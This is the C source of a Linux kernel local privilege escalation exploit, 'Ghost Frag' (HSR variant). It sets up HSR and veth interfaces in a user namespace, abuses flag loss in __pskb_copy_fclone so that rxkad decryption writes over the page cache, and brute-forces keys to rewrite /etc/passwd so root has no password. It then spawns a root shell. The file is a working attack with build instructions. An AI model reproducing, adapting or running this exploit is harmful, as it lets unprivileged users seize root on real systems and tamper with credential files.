//
// ghost_frag-hsr.c - Ghost Frag: HSR variant
//
// LPE via __pskb_copy_fclone SKBFL_SHARED_FRAG flag loss.
// Spliced page-cache data traverses an HSR ring where
// hsr_create_tagged_frame() calls __pskb_copy, stripping the flag.
// rxkad_verify_packet_1() decrypts in-place over the page cache.
//
// Requires: CONFIG_HSR, CONFIG_VETH, CONFIG_AF_RXRPC, CONFIG_USER_NS
// Build:    gcc -O2 -o ghost_frag-hsr ghost_frag-hsr.c
//

#include "ghost_frag_common.h"

// == Child: fake server in ns1/hsr1 ==

static int child_main(int ipc_fd, int file_fd)
{
    if (unshare(CLONE_NEWNET) < 0)
        { ERR("child unshare: %s", strerror(errno)); return -1; }

    char sync = 'R';
    write(ipc_fd, &sync, 1);
    read(ipc_fd, &sync, 1);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr = {0};
    strcpy(ifr.ifr_name, "lo");
    ifr.ifr_flags = IFF_UP | IFF_RUNNING;
    ioctl(s, SIOCSIFFLAGS, &ifr);
    close(s);

    run_cmd("ip link set vethA1 up; ip link set vethB1 up");
    run_cmd("ip link add hsr1 type hsr"
            " slave1 vethA1 slave2 vethB1 supervision 0 version 1");
    run_cmd("ip addr add 10.0.0.2/24 dev hsr1; ip link set hsr1 up");
    enable_sg("hsr1");
    sleep(1);

    sync = 'H';
    write(ipc_fd, &sync, 1);
    read(ipc_fd, &sync, 1);

    LOG("child: hsr1 ready");
    for (int i = 0; i < 3; i++)
        child_do_trigger(ipc_fd, file_fd);
    return 0;
}

// == Corruption stage ==

static int corruption_stage(int file_fd)
{
    if (setup_userns() < 0) return -1;

    run_cmd("ip link add vethA0 type veth peer name vethA1");
    run_cmd("ip link add vethB0 type veth peer name vethB1");

    int ipc[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, ipc);
    pid_t child = fork();
    if (child == 0) {
        close(ipc[0]);
        _exit(child_main(ipc[1], file_fd) == 0 ? 0 : 1);
    }
    close(ipc[1]);

    char sync;
    read(ipc[0], &sync, 1);
    run_cmd("ip link set vethA1 netns %d", child);
    run_cmd("ip link set vethB1 netns %d", child);
    sync = 'M';  write(ipc[0], &sync, 1);
    read(ipc[0], &sync, 1);

    run_cmd("ip link set vethA0 up; ip link set vethB0 up");
    run_cmd("ip link add hsr0 type hsr"
            " slave1 vethA0 slave2 vethB0 supervision 0 version 1");
    run_cmd("ip addr add 10.0.0.1/24 dev hsr0; ip link set hsr0 up");
    enable_sg("hsr0");
    sleep(1);

    int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (dummy < 0) { ERR("AF_RXRPC unavailable"); return -1; }
    close(dummy);

    sync = 'G';  write(ipc[0], &sync, 1);
    LOG("parent: hsr0 ready");

    uint8_t Ca[8], Cb[8], Cc[8];
    pread(file_fd, Ca, 8, 4);
    pread(file_fd, Cb, 8, 6);
    pread(file_fd, Cc, 8, 8);
    fcrypt_init_sboxes();
    uint64_t seed = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
    uint8_t Ka[8], Pa[8], Kb[8], Pb[8], Kc[8], Pc[8];

    LOG("brute-force K_A");
    if (find_key(Ca, check_colons, Ka, Pa, seed, "K_A") < 0) return -1;

    uint8_t Cb_a[8];
    memcpy(Cb_a, Pa + 2, 6);  memcpy(Cb_a + 6, Cb + 6, 2);
    LOG("brute-force K_B");
    if (find_key(Cb_a, check_zero_colon, Kb, Pb,
                 seed ^ 0xa5a5a5a5a5a5a5a5ULL, "K_B") < 0) return -1;

    uint8_t Cc_a[8];
    memcpy(Cc_a, Pb + 2, 6);  memcpy(Cc_a + 6, Cc + 6, 2);
    LOG("brute-force K_C");
    if (find_key(Cc_a, check_gecos, Kc, Pc,
                 seed ^ 0x5a5a5a5a5a5a5a5aULL, "K_C") < 0) return -1;

    LOG("trigger A @ offset 4");
    parent_do_trigger(ipc[0], Ka, 7000, 1234, 4, 8, 0);
    LOG("trigger B @ offset 6");
    parent_do_trigger(ipc[0], Kb, 7010, 1235, 6, 8, 1);
    LOG("trigger C @ offset 8");
    parent_do_trigger(ipc[0], Kc, 7020, 1236, 8, 8, 2);

    close(ipc[0]);
    int st; waitpid(child, &st, 0);
    return 0;
}

// == Main ==

int main(void)
{
    if (getuid() == 0) { execlp("/bin/bash", "bash", (char *)NULL); return 0; }
    fprintf(stderr,
        "\n  Ghost Frag - HSR variant\n"
        "  __pskb_copy_fclone flag loss LPE\n\n");
    LOG("uid=%u euid=%u", getuid(), geteuid());

    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { ERR("open /etc/passwd: %s", strerror(errno)); return 1; }
    void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { ERR("mmap: %s", strerror(errno)); return 1; }

    // Save first line for restore
    const char *p = (const char *)map;
    g_saved_len = 0;
    while (g_saved_len < (int)sizeof(g_saved_line) - 1 &&
           p[g_saved_len] != '\n') g_saved_len++;
    memcpy(g_saved_line, p, g_saved_len);
    g_saved_line[g_saved_len] = '\n';
    g_saved_len++;
    save_backup();

    if (memcmp(map, "root::0:0", 9) == 0) goto do_su;

    { pid_t ch = fork();
      if (ch == 0) _exit(corruption_stage(fd) == 0 ? 0 : 1);
      int st; waitpid(ch, &st, 0);
      if (!WIFEXITED(st) || WEXITSTATUS(st) != 0)
          { ERR("corruption stage failed"); return 1; } }

    if (p[4] != ':' || p[5] != ':' || p[6] != '0' || p[7] != ':') {
        ERR("verify failed");
        fprintf(stderr, "[*] after: \"");
        for (int i = 0; i < 32 && p[i] != '\n'; i++)
            fputc(p[i] >= 32 && p[i] < 127 ? p[i] : '.', stderr);
        fprintf(stderr, "\"\n");
        return 1;
    }
    LOG("/etc/passwd corrupted: root::0:0");

do_su:
    close(fd);
    LOG("spawning root shell via su ...");
    run_su_pty();
    return 0;
}
